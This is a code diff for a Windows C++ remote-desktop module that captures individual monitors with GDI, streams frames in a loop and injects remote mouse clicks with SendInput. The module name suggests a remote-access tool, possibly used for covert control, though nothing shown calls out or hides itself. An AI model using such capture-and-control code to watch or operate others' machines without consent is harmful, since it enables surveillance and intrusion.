@@ -51,6 +51,28 @@ bool mod_RemoteDesktop::m_Vmouse() {
     return this->isMouseOn;
 }
 
+void mod_RemoteDesktop::m_SendClick(int x, int y, int monitor_index) {
+    Monitor monitor = this->m_GetMonitor(monitor_index);
+    if (monitor.rectData.resWidth > 0) {
+        int normalized_x = ((x - monitor.rectData.xStart) * 65535) / monitor.rectData.resWidth;
+        int normalized_y = ((y - monitor.rectData.yStart) * 65535) / monitor.rectData.resHeight;
+
+        INPUT inputs[1] = {};
+        ZeroMemory(inputs, sizeof(inputs));
+
+        inputs[0].type = INPUT_MOUSE;
+        inputs[0].mi.dx = normalized_x;
+        inputs[0].mi.dy = normalized_y;
+        inputs[0].mi.dwFlags = MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
+        UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
+        if (uSent != ARRAYSIZE(inputs)) {
+           DebugPrint("SendInput failed: 0x", HRESULT_FROM_WIN32(GetLastError()));
+        }
+    }else {
+        DebugPrint("[X] El monitor seleccionado no existe", monitor_index);
+    }
+}
+
 void mod_RemoteDesktop::InitGDI() {
     if (Gdiplus::GdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
         this->isGDIon = true;
@@ -82,8 +104,14 @@ mod_RemoteDesktop::~mod_RemoteDesktop() {
     return;
 }
 
-std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
+std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality, int index) {
     std::vector<char> cBuffer;
+
+    Monitor monitor = this->m_GetMonitor(index);
+    if (monitor.rectData.resHeight == 0) {
+        DebugPrint("[X] El monitor no es valido o no se ha obtenido al lista");
+        return cBuffer;
+    }
     
     if (!this->isGDIon) {
         DebugPrint("GDI no esta inicializado, init...");
@@ -94,13 +122,10 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
         }
     }
     
-    HWINSTA hWindowsStation = NULL;
-    HDESK hInputDesktop = NULL;
-    HDESK hOrigDesktop = NULL;
-    HWND hDesktopWnd = NULL;
-    HDC hdc = NULL;
-    HDC hmemdc = NULL;
-    HBITMAP hbmp = NULL;
+    HDC hdcMonitor = GetDC(NULL);
+    HDC hdcMemDC;
+    HWND hDesktopWnd = GetDesktopWindow();
+    HBITMAP hmpScreen = NULL;
 
     Gdiplus::Bitmap* pScreenShot = nullptr;
     IStream* oStream;
@@ -114,15 +139,6 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
     int cursorY = 0;
     BITMAP bmpCursor = { 0 };
     
-    OSVERSIONINFO os;
-    int xm = SM_CXVIRTUALSCREEN;
-    int ym = SM_CYVIRTUALSCREEN;
-    int xp = SM_XVIRTUALSCREEN;
-    int yp = SM_YVIRTUALSCREEN;
-    int sx = 0;
-    int sy = 0;
-    int sxpos = 0;
-    int sypos = 0;
 
     HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
@@ -130,67 +146,27 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
         goto EndSec;
     }
 
-    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-    if (!GetVersionEx(&os)) {
-        DebugPrint("GetVersionEx failed\n");
-        goto EndSec;
-    }
-    if (os.dwMajorVersion <= 4) {
-        xm = SM_CXSCREEN;
-        ym = SM_CYSCREEN;
-    }
-
-    hWindowsStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
-    if (!hWindowsStation) {
-        if (RevertToSelf()) {
-            hWindowsStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
-        }
-    }
-    if (!hWindowsStation) {
-        DebugPrint("Couldnt get the Winsta0 Window Station\n");
-        goto EndSec;
-    }
-    
-    if (!SetProcessWindowStation(hWindowsStation)) {
-        DebugPrint("Unable to set process windows station\n");
-        goto EndSec;
-    }
-    hInputDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
-    if (!hInputDesktop) {
-        DebugPrint("OpenInputDesktop failed\n");
-        goto EndSec;
-    }
-    hOrigDesktop = GetThreadDesktop(GetCurrentThreadId());
-    SetThreadDesktop(hInputDesktop);
-    hDesktopWnd = GetDesktopWindow();
-    hdc = GetDC(hDesktopWnd);
-    if (!hdc) {
+    if (!hdcMonitor) {
         DebugPrint("GetDC failed\n");
         goto EndSec;
     }
-    hmemdc = CreateCompatibleDC(hdc);
-    if (!hmemdc) {
+
+    hdcMemDC = CreateCompatibleDC(hdcMonitor);
+    if (!hdcMemDC) {
         DebugPrint("GetcomtabielDC failed\n");
         goto EndSec;
     }
-    sx = GetSystemMetrics(xm);
-    sy = GetSystemMetrics(ym);
 
-    if (os.dwMajorVersion >= 4) {
-        sxpos = GetSystemMetrics(xp);
-        sypos = GetSystemMetrics(yp);
-    }
-
-    hbmp = CreateCompatibleBitmap(hdc, sx, sy);
-    if (!hbmp) {
+    hmpScreen = CreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
+    if (!hmpScreen) {
         DebugPrint("Createcompatiblebitmap failed\n");
         goto EndSec;
     }
-    if (!SelectObject(hmemdc, hbmp)) {
+    if (!SelectObject(hdcMemDC, hmpScreen)) {
         DebugPrint("select object failed\n");
         goto EndSec;
     }
-    if (!BitBlt(hmemdc, 0, 0, sx, sy, hdc, sxpos, sypos, SRCCOPY)) {
+    if (!BitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
         DebugPrint("bitblt failed\n");
         goto EndSec;
     }
@@ -204,7 +180,7 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
             cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
             cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
             GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
-            DrawIconEx(hmemdc, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
+            DrawIconEx(hdcMemDC, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
         }
     }
 
@@ -226,7 +202,7 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
 
     GetEncoderClsid(L"image/jpeg", &imageCLSID);
     
-    pScreenShot = new Gdiplus::Bitmap(hbmp, (HPALETTE)NULL);
+    pScreenShot = new Gdiplus::Bitmap(hmpScreen, (HPALETTE)NULL);
 
     if (!pScreenShot) {
         DebugPrint("No se pudo reservar memoria para crear el bitmap");
@@ -256,33 +232,23 @@ EndSec:
         pScreenShot = nullptr;
     }
 
-    
+    if (hdcMonitor) {
+        ReleaseDC(NULL, hdcMonitor);
+    }
 
-    if (hdc) {
-        ReleaseDC(hDesktopWnd, hdc);
+    if (hdcMemDC) {
+        DeleteDC(hdcMemDC);
     }
-    if (hmemdc) {
-        DeleteDC(hmemdc);
-    }
-    if (hbmp) {
-        DeleteObject(hbmp);
-    }
-    if (hOrigDesktop) {
-        SetThreadDesktop(hOrigDesktop);
-    }
-    if (hWindowsStation) {
-        CloseWindowStation(hWindowsStation);
-    }
-    if (hInputDesktop) {
-        CloseDesktop(hInputDesktop);
+    if (hmpScreen) {
+        DeleteObject(hmpScreen);
     }
 
     return cBuffer;
 
 }
 
-void mod_RemoteDesktop::SpawnThread(int quality) {
-    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality);
+void mod_RemoteDesktop::SpawnThread(int quality, int monitor_index) {
+    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality, monitor_index);
 }
 
 void mod_RemoteDesktop::DetenerLive() {
@@ -297,13 +263,13 @@ void mod_RemoteDesktop::DetenerLive() {
     DebugPrint("[RD] Done omar :v");
 }
 
-void mod_RemoteDesktop::IniciarLive(int quality) {
+void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
     this->isRunning = true;
     this->m_UpdateQuality(quality);
     std::vector<char> cOldBuffer;
     while (this->m_isRunning()) {
         
-        std::vector<char> scrBuffer = this->getFrameBytes(this->m_Quality());
+        std::vector<char> scrBuffer = this->getFrameBytes(this->m_Quality(), monitor_index);
         if (scrBuffer.size() > 0) {
             if(this->m_AreEqual(scrBuffer, cOldBuffer)){
                 //buffers are equal
@@ -341,11 +307,16 @@ std::vector<char> mod_RemoteDesktop::m_Diff(const std::vector<char>& cBuffer1, c
 }
 
 std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
-    this->vc_Monitores.clear();
+    this->m_Clear_Monitores();
+    
     EnumDisplayMonitors(NULL, NULL, this->MonitorEnumProc, 0);
-    this->vc_Monitores.insert(this->vc_Monitores.begin(), tmp_Monitores.begin(), tmp_Monitores.end());
+    
+    for (Monitor monitor : tmp_Monitores) {
+        this->m_Agregar_Monitor(monitor);
+    }
     tmp_Monitores.clear();
-    return this->vc_Monitores;
+
+    return this->m_GetVectorCopy();
 }
 
 BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT rectMonitor, LPARAM lparam) {
@@ -358,10 +329,35 @@ BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPREC
     new_Monitor.rectData.resHeight = height;
     new_Monitor.rectData.xStart = rectMonitor->left;
     new_Monitor.rectData.yStart = rectMonitor->top;
+    ZeroMemory(new_Monitor.szDevice, sizeof(new_Monitor.szDevice));
     if (GetMonitorInfo(hMonitor, &info)) {
         memcpy(new_Monitor.szDevice, info.szDevice, sizeof(new_Monitor.szDevice) - 1);
     }
     tmp_Monitores.push_back(new_Monitor);
 
     return TRUE;
+}
+
+void mod_RemoteDesktop::m_Agregar_Monitor(Monitor& new_monitor) {
+    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
+    this->vc_Monitores.push_back(new_monitor);
+}
+
+void mod_RemoteDesktop::m_Clear_Monitores(){
+    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
+    this->vc_Monitores.clear();
+}
+
+Monitor mod_RemoteDesktop::m_GetMonitor(int index){
+    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
+    if (index < this->vc_Monitores.size()) {
+        return this->vc_Monitores[index];
+    }
+    Monitor dummy;
+    return dummy;
+}
+
+std::vector<Monitor> mod_RemoteDesktop::m_GetVectorCopy(){
+    std::unique_lock<std::mutex> lock(this->mtx_Monitores);
+    return this->vc_Monitores;
 }
